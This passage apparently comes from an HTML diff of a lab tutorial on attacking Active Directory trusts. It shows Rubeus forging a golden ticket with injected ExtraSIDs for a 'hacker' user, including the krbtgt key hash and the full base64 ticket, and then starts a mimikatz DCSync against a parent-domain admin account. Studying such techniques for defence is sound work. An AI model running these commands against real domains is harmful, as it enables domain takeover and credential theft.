class="p">/</span><span class="n">ptt</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>   <span class="n">______</span>        <span class="n">_</span>                      
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>  <span class="p">(</span><span class="n">_____</span> <span class="p">\</span>      <span class="p">|</span> <span class="p">|</span>                     
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span> 
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>  <span class="p">|</span>  <span class="n">__</span>  <span class="p">/|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  <span class="n">_</span> <span class="p">\|</span> <span class="n">___</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|/</span><span class="n">___</span><span class="p">)</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  <span class="p">|</span> <span class="p">|</span>  <span class="p">\</span> <span class="p">\|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">___</span> <span class="p">|</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  <span class="p">|</span><span class="n">_</span><span class="p">|</span>   <span class="p">|</span><span class="n">_</span><span class="p">|</span><span class="n">____</span><span class="p">/|</span><span class="n">____</span><span class="p">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="p">/(</span><span class="n">___</span><span class="p">/</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>  <span class="n">v2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> 
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">[*]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Build</span> <span class="n">TGT</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="p">[*]</span> <span class="n">Building</span> <span class="n">PAC</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="p">[*]</span> <span class="n">Domain</span>         <span class="p">:</span> <span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">INTERNAL</span><span class="p">)</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="p">[*]</span> <span class="n">SID</span>            <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2806153819</span><span class="p">-</span><span class="n">209893948</span><span class="p">-</span><span class="n">922872689</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="p">[*]</span> <span class="n">UserId</span>         <span class="p">:</span> <span class="n">500</span>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="p">[*]</span> <span class="n">Groups</span>         <span class="p">:</span> <span class="n">520</span><span class="p">,</span><span class="n">512</span><span class="p">,</span><span class="n">513</span><span class="p">,</span><span class="n">519</span><span class="p">,</span><span class="n">518</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="p">[*]</span> <span class="n">ExtraSIDs</span>      <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="p">[*]</span> <span class="n">ServiceKey</span>     <span class="p">:</span> <span class="n">9D765B482771505CBE97411065964D5F</span>
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="p">[*]</span> <span class="n">ServiceKeyType</span> <span class="p">:</span> <span class="n">KERB_CHECKSUM_HMAC_MD5</span>
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="p">[*]</span> <span class="n">KDCKey</span>         <span class="p">:</span> <span class="n">9D765B482771505CBE97411065964D5F</span>
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="p">[*]</span> <span class="n">KDCKeyType</span>     <span class="p">:</span> <span class="n">KERB_CHECKSUM_HMAC_MD5</span>
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="p">[*]</span> <span class="n">Service</span>        <span class="p">:</span> <span class="n">krbtgt</span>
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="p">[*]</span> <span class="n">Target</span>         <span class="p">:</span> <span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span>
+</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>
+</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="p">[*]</span> <span class="n">Generating</span> <span class="n">EncTicketPart</span>
+</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="p">[*]</span> <span class="n">Signing</span> <span class="n">PAC</span>
+</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="p">[*]</span> <span class="n">Encrypting</span> <span class="n">EncTicketPart</span>
+</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="p">[*]</span> <span class="n">Generating</span> <span class="n">Ticket</span>
+</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="p">[*]</span> <span class="n">Generated</span> <span class="n">KERB-CRED</span>
+</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="p">[*]</span> <span class="n">Forged</span> <span class="n">a</span> <span class="n">TGT</span> <span class="k">for</span> <span class="s1">&#39;hacker@INTERNAL.TRUSTED.LOCAL&#39;</span>
+</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>
+</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a><span class="p">[*]</span> <span class="n">AuthTime</span>       <span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">29</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="n">AM</span>
+</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a><span class="p">[*]</span> <span class="n">StartTime</span>      <span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">29</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="n">AM</span>
+</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a><span class="p">[*]</span> <span class="n">EndTime</span>        <span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">29</span><span class="p">/</span><span class="n">2022</span> <span class="n">8</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="n">PM</span>
+</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a><span class="p">[*]</span> <span class="n">RenewTill</span>      <span class="p">:</span> <span class="n">4</span><span class="p">/</span><span class="n">5</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="n">AM</span>
+</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>
+</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a><span class="p">[*]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span><span class="p">):</span>
+</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>      <span class="n">doIF0zCCBc</span><span class="p">+</span><span class="n">gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG</span>
+</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>      <span class="n">UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M</span>
+</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>      <span class="n">T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH</span>
+</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>      <span class="n">T3zO</span><span class="p">/</span><span class="n">Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx</span><span class="p">++</span><span class="n">2iX94uRrwa</span><span class="p">/</span><span class="n">S</span>
+</span><span id="__span-7-45"><a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a>      <span class="n">VfgHhAuxKPlIi2phwjkxYETluKl26AUo2</span><span class="p">+</span><span class="n">WwxDXmXwGJ6LLWN1W4YGScgXAX</span><span class="p">+</span><span class="n">Kgs9xrAqJMabsAQqDfy</span>
+</span><span id="__span-7-46"><a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a>      <span class="n">k7</span><span class="p">+</span><span class="n">0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDajUN4mxsqINm7qNQcZHWN8kFSfAbqyD</span><span class="p">/</span><span class="n">OZIMc</span>
+</span><span id="__span-7-47"><a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>      <span class="n">g78hZ8IYL</span><span class="p">+</span><span class="n">Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx</span><span class="p">/</span><span class="n">i3PfWqP</span><span class="p">+</span><span class="n">dNREtldE2sgIUQm</span>
+</span><span id="__span-7-48"><a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>      <span class="n">9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp</span><span class="p">/</span><span class="n">vmPBlqQGxAtRKzgzY</span>
+</span><span id="__span-7-49"><a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>      <span class="n">acuk8YYogiP6815</span><span class="p">+</span><span class="n">x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd</span><span class="p">/</span><span class="n">EFM7S3NdMnJOz</span>
+</span><span id="__span-7-50"><a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>      <span class="n">X3P7ObzVTAPQ</span><span class="p">/</span><span class="n">o9lSaXlopQH6L46z6PTcC</span><span class="p">/</span><span class="n">4GwaRbqVnm1RU0O3VpVr5bgaR</span><span class="p">+</span><span class="n">Nas5VYGBYIHOw3Qx5YT</span>
+</span><span id="__span-7-51"><a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>      <span class="n">3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz</span><span class="p">+</span><span class="nb">H</span>
+</span><span id="__span-7-52"><a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a>      <span class="n">WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG</span><span class="p">+</span><span class="n">eghE</span><span class="p">+</span><span class="n">CN999gHNMG</span>
+</span><span id="__span-7-53"><a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a>      <span class="n">Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo</span>
+</span><span id="__span-7-54"><a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>      <span class="p">/</span><span class="n">RIfLx12GlLzN5y7132Rj4iZlkVgAyB6</span><span class="p">+</span><span class="n">PIpjuDLDSq6UJnHRkYlJ</span><span class="p">/</span><span class="n">3l5j0KxgjdZbwoFbC7p76IPC3B</span>
+</span><span id="__span-7-55"><a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a>      <span class="n">aY97mXatvMfrrc</span><span class="p">/</span><span class="n">Aw5JaIFSaOYQ8M</span><span class="p">/</span><span class="n">frCG738e90IK</span><span class="p">/</span><span class="n">2eTFZD9</span><span class="p">/</span><span class="n">kKXDgmwMowBEmT3IWj9lgOixNcNV</span><span class="p">/</span>
+</span><span id="__span-7-56"><a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a>      <span class="n">OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW</span><span class="p">/</span><span class="n">pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3</span>
+</span><span id="__span-7-57"><a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a>      <span class="n">sERVQ5VSc7u4oaAIyv7Acq</span><span class="p">+</span><span class="n">UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH</span>
+</span><span id="__span-7-58"><a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a>      <span class="n">eOhKwWOY6GVpVWEShRLDl9</span><span class="p">/</span><span class="n">XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA</span><span class="p">+</span><span class="n">2</span><span class="p">+</span><span class="n">xps6WS</span><span class="p">/</span><span class="n">NNf1vZtUV</span><span class="p">/</span><span class="n">KRLlW</span>
+</span><span id="__span-7-59"><a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a>      <span class="n">sL5v91jmzGiZQcENkLeozZ7kIsY</span><span class="p">/</span><span class="n">zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e</span><span class="p">+</span><span class="n">cXZ</span><span class="p">+</span><span class="n">NXLKxex37HQ</span>
+</span><span id="__span-7-60"><a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a>      <span class="n">F5aNP7EITdjQds0lbyb9K</span><span class="p">/</span><span class="n">iUY27iyw7dRVLz3y5Dic4S4</span><span class="p">+</span><span class="n">cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij</span>
+</span><span id="__span-7-61"><a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a>      <span class="n">Hf</span><span class="p">+</span><span class="n">jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T</span>
+</span><span id="__span-7-62"><a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a>      <span class="n">JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo</span>
+</span><span id="__span-7-63"><a id="__codelineno-7-63" name="__codelineno-7-63" href="#__codelineno-7-63"></a>      <span class="n">YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy</span>
+</span><span id="__span-7-64"><a id="__codelineno-7-64" name="__codelineno-7-64" href="#__codelineno-7-64"></a>      <span class="n">MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP</span>
+</span><span id="__span-7-65"><a id="__codelineno-7-65" name="__codelineno-7-65" href="#__codelineno-7-65"></a>      <span class="n">Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA</span><span class="p">==</span>
+</span><span id="__span-7-66"><a id="__codelineno-7-66" name="__codelineno-7-66" href="#__codelineno-7-66"></a>
+</span><span id="__span-7-67"><a id="__codelineno-7-67" name="__codelineno-7-67" href="#__codelineno-7-67"></a><span class="p">[+]</span> <span class="n">Ticket</span> <span class="n">successfully</span> <span class="n">imported</span><span class="p">!</span>
+</span></code></pre></div>
+<p>Once again, we can check that the ticket is in memory using the <code>klist</code> command.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="n">klist</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">Current</span> <span class="n">LogonId</span> <span class="n">is</span> <span class="n">0</span><span class="p">:</span><span class="n">0xf6495</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">Cached</span> <span class="n">Tickets</span><span class="p">:</span> <span class="p">(</span><span class="n">1</span><span class="p">)</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c">#0&gt; Client: hacker @ INTERNAL.TRUSTED.LOCAL</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>    <span class="n">Server</span><span class="p">:</span> <span class="n">krbtgt</span><span class="p">/</span><span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">@</span> <span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    <span class="n">KerbTicket</span> <span class="n">Encryption</span> <span class="n">Type</span><span class="p">:</span> <span class="n">RSADSI</span> <span class="n">RC4-HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    <span class="n">Ticket</span> <span class="n">Flags</span> <span class="n">0x40e00000</span> <span class="p">-&gt;</span> <span class="n">forwardable</span> <span class="n">renewable</span> <span class="n">initial</span> <span class="n">pre_authent</span> 
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    <span class="nb">Start </span><span class="n">Time</span><span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">29</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>    <span class="k">End</span> <span class="n">Time</span><span class="p">:</span>   <span class="n">3</span><span class="p">/</span><span class="n">29</span><span class="p">/</span><span class="n">2022</span> <span class="n">20</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>    <span class="n">Renew</span> <span class="n">Time</span><span class="p">:</span> <span class="n">4</span><span class="p">/</span><span class="n">5</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">41</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>    <span class="n">Session</span> <span class="n">Key</span> <span class="n">Type</span><span class="p">:</span> <span class="n">RSADSI</span> <span class="n">RC4-HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>    <span class="n">Cache</span> <span class="n">Flags</span><span class="p">:</span> <span class="n">0x1</span> <span class="p">-&gt;</span> <span class="n">PRIMARY</span> 
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>    <span class="n">Kdc</span> <span class="n">Called</span><span class="p">:</span> 
+</span></code></pre></div>
+<p>Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the <code>lab_adm</code> Domain Admin user.</p>
+<h3 id="performing-a-dcsync-attack">Performing a DCSync Attack</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>  <span class="p">.</span><span class="c">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a> <span class="p">.</span><span class="c">## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a> <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a> <span class="c">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a> <span class="s1">&#39;## v ##&#39;</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="p">.</span><span class="n">letoux</span><span class="nv">@gmail</span><span class="p">.</span><span class="n">com</span> <span class="p">)</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>  <span class="s1">&#39;#####&#39;</span>        <span class="p">&gt;</span> <span class="n">https</span><span class="p">://</span><span class="n">pingcastle</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span> <span class="n">https</span><span class="p">://</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="n">com</span> <span class="p">***/</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="n">mimikatz</span> <span class="c"># lsadump::dcsync /user:TRUSTED\lab_adm</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="no">[DC]</span> <span class="s1">&#39;TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="no">[DC]</span> <span class="s1">&#39;DC01.TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="no">[DC]</span> <span class="s1">&#39;TRUSTED\lab_adm&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">lab_adm</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">lab_adm</span>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00010200</span> <span class="p">(</span> <span class="n">NORMAL_ACCOUNT</span> <span class="n">DONT_EXPIRE_PASSWD</span> <span class="p">)</span>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">27</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">53</span><span class="p">:</span><span class="n">21</span> <span class="n">PM</span>
